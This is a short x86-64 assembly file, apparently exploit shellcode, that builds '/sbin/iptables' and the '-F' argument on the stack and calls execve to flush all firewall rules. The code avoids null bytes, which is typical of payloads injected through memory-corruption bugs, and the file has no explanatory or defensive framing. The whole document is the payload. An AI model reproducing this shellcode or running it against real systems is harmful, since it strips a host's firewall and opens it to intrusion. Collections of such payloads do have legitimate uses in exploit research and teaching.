section .text
    global _start

_start:
    xor     rax, rax
    push    rax
    push    word 0x462d
    mov     rcx, rsp

    mov     rbx, 0x73656c626174ffff
    shr     rbx, 0x10
    push    rbx
    mov     rbx, 0x70692f6e6962732f
    push    rbx
    mov     rdi, rsp

    push    rax
    push    rcx
    push    rdi
    mov     rsi, rsp

    ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
    mov     al, 0x3b
    syscall

